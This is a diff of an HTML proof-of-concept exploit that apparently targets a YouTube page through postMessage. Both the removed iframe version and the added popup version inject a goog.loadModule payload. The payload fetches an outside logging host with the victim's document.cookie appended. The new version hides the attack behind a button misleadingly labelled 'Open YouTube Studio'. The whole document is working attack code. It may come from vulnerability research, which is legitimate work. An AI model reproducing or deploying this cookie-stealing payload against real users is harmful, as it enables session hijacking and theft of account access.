@@ -1,23 +1,25 @@
 <!DOCTYPE html>
 <html>
 <body>
+  <button onclick="exploit()">Open YouTube Studio</button>
   <script>
-    // Open the vulnerable page in a hidden iframe
-    const iframe = document.createElement('iframe');
-    iframe.style.display = 'none';
-    iframe.src = 'https://www.youtube.com/persist_identity';
-    document.body.appendChild(iframe);
+    function exploit() {
+      // Open the target URL in a new tab
+      const popup = window.open('https://www.youtube.com/persist_identity');
 
-    // Wait for the page to load, then inject the payload
-    iframe.onload = function() {
-      const payload = `
-        goog.loadModule(function(exports) {
-          fetch("https://f3rdn35f.ssrf.cvssadvisor.com/log?cookie=" + encodeURIComponent(document.cookie));
-          return exports;
-        });
-      `;
-      iframe.contentWindow.postMessage(payload, 'https://www.youtube.com/persist_identity');
-    };
+      // Wait for the page to load, then inject the payload
+      setTimeout(() => {
+        const payload = `
+          goog.loadModule(function(exports) {
+            fetch("https://f3rdn35f.ssrf.cvssadvisor.com/log?cookie=" + encodeURIComponent(document.cookie));
+            exports.PoC = true;
+            return exports;
+          });
+        `;
+        // Send the payload to the new tab
+        popup.postMessage(payload, 'https://www.youtube.com/persist_identity');
+      }, 3000); // Adjust delay based on page load time
+    }
   </script>
 </body>
 </html>
